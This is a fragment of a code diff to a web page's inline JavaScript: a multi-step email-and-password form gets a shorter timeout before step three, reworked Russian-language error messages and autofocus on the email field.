                         document.getElementById('step3').classList.remove('hidden');
-                    }, 1000);
+                    }, 700);
                 } else {
-                    result.textContent = '❌ ' + (data.error || 'попробуйте снова');
-                    result.style.color = '#d93025';
+                    errorMsg.textContent = data.error || 'Неверный пароль. Повторите попытку.';
                 }
             } catch (err) {
-                result.textContent = '❌ Ошибка соединения';
-                result.style.color = '#d93025';
+                errorMsg.textContent = 'Ошибка соединения. Попробуйте снова.';
             }
         }
+
+        // Автофокус на email
+        window.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => document.getElementById('email').focus(), 100);
+        });
     </script>
 </body>
 </html>
